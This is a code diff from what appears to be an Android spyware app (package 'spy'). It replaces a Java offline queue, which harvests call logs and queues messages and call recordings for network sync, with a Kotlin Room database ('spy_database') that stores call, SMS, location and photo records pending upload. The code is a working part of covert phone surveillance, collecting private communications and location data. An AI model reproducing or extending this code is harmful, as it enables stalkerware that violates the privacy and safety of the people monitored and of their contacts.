@@ -1,195 +1,114 @@
-package com.gauravhanna.spy;
+package com.gauravhanna.spy.utils
 
-import android.content.ContentResolver;
-import android.content.Context;
-import android.database.Cursor;
-import android.provider.CallLog;
-import org.json.JSONArray;
-import org.json.JSONObject;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.FileInputStream;
-import java.util.ArrayList;
-import java.util.List;
+import android.content.Context
+import androidx.room.*
+import kotlinx.coroutines.flow.Flow
 
-public class OfflineQueue {
-    private static final String QUEUE_FILE = "offline_queue.json";
-    private static Object lock = new Object();
+// ========== ENTITY ==========
+@Entity(tableName = "offline_data")
+data class OfflineData(
+    @PrimaryKey(autoGenerate = true)
+    val id: Long = 0,
+    val type: String,  // "call", "sms", "location", "photo", etc.
+    val data: String,  // JSON string of data
+    val timestamp: Long = System.currentTimeMillis(),
+    var retryCount: Int = 0
+)
 
-    // CallLogEntry inner class to hold call data
-    private static class CallLogEntry {
-        String contactName;
-        String phoneNumber;
-        int callType;
-        int duration;
-        long timestamp;
+// ========== DAO ==========
+@Dao
+interface OfflineDataDao {
+    @Insert
+    suspend fun insert(data: OfflineData)
 
-        CallLogEntry(String contactName, String phoneNumber, int callType, int duration, long timestamp) {
-            this.contactName = contactName;
-            this.phoneNumber = phoneNumber;
-            this.callType = callType;
-            this.duration = duration;
-            this.timestamp = timestamp;
-        }
-    }
+    @Query("SELECT * FROM offline_data ORDER BY timestamp ASC")
+    fun getAllPending(): Flow<List<OfflineData>>
 
-    // Get call logs from content resolver
-    private static List<CallLogEntry> getCallLogs(ContentResolver contentResolver) {
-        List<CallLogEntry> calls = new ArrayList<>();
-        String[] projection = {
-            CallLog.Calls.CACHED_NAME,
-            CallLog.Calls.NUMBER,
-            CallLog.Calls.TYPE,
-            CallLog.Calls.DURATION,
-            CallLog.Calls.DATE
-        };
-        
-        try (Cursor cursor = contentResolver.query(
-                CallLog.Calls.CONTENT_URI,
-                projection,
-                null,
-                null,
-                CallLog.Calls.DATE + " DESC LIMIT 100")) { // Get last 100 calls
-            
-            if (cursor != null) {
-                int nameColumn = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
-                int numberColumn = cursor.getColumnIndex(CallLog.Calls.NUMBER);
-                int typeColumn = cursor.getColumnIndex(CallLog.Calls.TYPE);
-                int durationColumn = cursor.getColumnIndex(CallLog.Calls.DURATION);
-                int dateColumn = cursor.getColumnIndex(CallLog.Calls.DATE);
-                
-                while (cursor.moveToNext()) {
-                    String name = cursor.getString(nameColumn);
-                    String number = cursor.getString(numberColumn);
-                    int type = cursor.getInt(typeColumn);
-                    int duration = cursor.getInt(durationColumn);
-                    long timestamp = cursor.getLong(dateColumn);
-                    
-                    calls.add(new CallLogEntry(
-                        name != null ? name : "Unknown",
-                        number != null ? number : "",
-                        type,
-                        duration,
-                        timestamp
-                    ));
-                }
+    @Query("SELECT * FROM offline_data ORDER BY timestamp ASC LIMIT :limit")
+    suspend fun getPendingData(limit: Int): List<OfflineData>
+
+    @Delete
+    suspend fun delete(data: OfflineData)
+
+    @Update
+    suspend fun update(data: OfflineData)
+
+    @Query("DELETE FROM offline_data WHERE retryCount > 5")
+    suspend fun deleteFailed()
+
+    @Query("SELECT COUNT(*) FROM offline_data")
+    suspend fun getCount(): Int
+}
+
+// ========== DATABASE ==========
+@Database(
+    entities = [OfflineData::class],
+    version = 1,
+    exportSchema = false
+)
+abstract class AppDatabase : RoomDatabase() {
+    abstract fun offlineDataDao(): OfflineDataDao
+
+    companion object {
+        @Volatile
+        private var INSTANCE: AppDatabase? = null
+
+        fun getInstance(context: Context): AppDatabase {
+            return INSTANCE ?: synchronized(this) {
+                val instance = Room.databaseBuilder(
+                    context.applicationContext,
+                    AppDatabase::class.java,
+                    "spy_database"
+                ).build()
+                INSTANCE = instance
+                instance
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-        
-        return calls;
-    }
-
-    // Convert call type to string
-    private static String callTypeString(int callType) {
-        switch (callType) {
-            case CallLog.Calls.INCOMING_TYPE:
-                return "INCOMING";
-            case CallLog.Calls.OUTGOING_TYPE:
-                return "OUTGOING";
-            case CallLog.Calls.MISSED_TYPE:
-                return "MISSED";
-            default:
-                return "UNKNOWN";
         }
     }
+}
 
-    // Collect and send calls - merged method
-    public static void collectAndSendCalls(Context context) {
-        List<CallLogEntry> calls = getCallLogs(context.getContentResolver());
-        for (CallLogEntry call : calls) {
-            addCallLog(context, call.contactName, call.phoneNumber, 
-                      callTypeString(call.callType), call.duration, call.timestamp);
-        }
+// ========== OFFLINE QUEUE MANAGER ==========
+object OfflineQueue {
+
+    suspend fun addData(context: Context, type: String, data: String) {
+        val db = AppDatabase.getInstance(context)
+        val offlineData = OfflineData(
+            type = type,
+            data = data,
+            timestamp = System.currentTimeMillis()
+        )
+        db.offlineDataDao().insert(offlineData)
     }
 
-    public static void addCallLog(Context context, String contact, String number, String type, int duration, long timestamp) {
-        JSONObject obj = new JSONObject();
-        try {
-            obj.put("type", "call");
-            obj.put("contact", contact);
-            obj.put("number", number);
-            obj.put("callType", type);
-            obj.put("duration", duration);
-            obj.put("timestamp", timestamp);
-            addToQueue(context, obj);
-        } catch (Exception e) { e.printStackTrace(); }
+    suspend fun getPendingData(context: Context, limit: Int = 50): List<OfflineData> {
+        val db = AppDatabase.getInstance(context)
+        return db.offlineDataDao().getPendingData(limit)
     }
 
-    public static void addMessage(Context context, String app, String contact, String message, long timestamp, boolean incoming) {
-        JSONObject obj = new JSONObject();
-        try {
-            obj.put("type", "message");
-            obj.put("app", app);
-            obj.put("contact", contact);
-            obj.put("message", message);
-            obj.put("timestamp", timestamp);
-            obj.put("isIncoming", incoming);
-            addToQueue(context, obj);
-        } catch (Exception e) { e.printStackTrace(); }
+    suspend fun removeData(context: Context, data: OfflineData) {
+        val db = AppDatabase.getInstance(context)
+        db.offlineDataDao().delete(data)
     }
 
-    public static void addRecording(Context context, String filePath, String phoneNumber, long timestamp) {
-        // For recording, we'll store the file path and later convert to base64
-        JSONObject obj = new JSONObject();
-        try {
-            obj.put("type", "recording");
-            obj.put("filePath", filePath);
-            obj.put("phoneNumber", phoneNumber);
-            obj.put("timestamp", timestamp);
-            addToQueue(context, obj);
-        } catch (Exception e) { e.printStackTrace(); }
-    }
+    suspend fun incrementRetryCount(context: Context, data: OfflineData) {
+        val db = AppDatabase.getInstance(context)
+        val updated = data.copy(retryCount = data.retryCount + 1)
+        db.offlineDataDao().update(updated)
 
-    private static void addToQueue(Context context, JSONObject obj) {
-        synchronized (lock) {
-            try {
-                File file = new File(context.getFilesDir(), QUEUE_FILE);
-                JSONArray queue = new JSONArray();
-                if (file.exists()) {
-                    try (FileInputStream fis = new FileInputStream(file)) {
-                        byte[] data = new byte[(int) file.length()];
-                        fis.read(data);
-                        String json = new String(data);
-                        queue = new JSONArray(json);
-                    }
-                }
-                queue.put(obj);
-                try (FileOutputStream fos = new FileOutputStream(file)) {
-                    fos.write(queue.toString().getBytes());
-                }
-                // Trigger sync if online
-                NetworkHelper.triggerSync(context);
-            } catch (Exception e) { e.printStackTrace(); }
+        // Delete if retry count exceeds 5
+        if (updated.retryCount > 5) {
+            db.offlineDataDao().delete(updated)
         }
     }
 
-    public static List<JSONObject> getAllPending(Context context) {
-        List<JSONObject> list = new ArrayList<>();
-        synchronized (lock) {
-            try {
-                File file = new File(context.getFilesDir(), QUEUE_FILE);
-                if (file.exists()) {
-                    try (FileInputStream fis = new FileInputStream(file)) {
-                        byte[] data = new byte[(int) file.length()];
-                        fis.read(data);
-                        String json = new String(data);
-                        JSONArray queue = new JSONArray(json);
-                        for (int i = 0; i < queue.length(); i++) {
-                            list.add(queue.getJSONObject(i));
-                        }
-                    }
-                }
-            } catch (Exception e) { e.printStackTrace(); }
-        }
-        return list;
+    suspend fun getPendingCount(context: Context): Int {
+        val db = AppDatabase.getInstance(context)
+        return db.offlineDataDao().getCount()
     }
 
-    public static void clearQueue(Context context) {
-        synchronized (lock) {
-            File file = new File(context.getFilesDir(), QUEUE_FILE);
-            if (file.exists()) file.delete();
-        }
+    // For call recordings
+    suspend fun addRecording(context: Context, filePath: String, phoneNumber: String, timestamp: Long) {
+        val data = """{"filePath":"$filePath","phoneNumber":"$phoneNumber","timestamp":$timestamp}"""
+        addData(context, "recording", data)
     }
 }
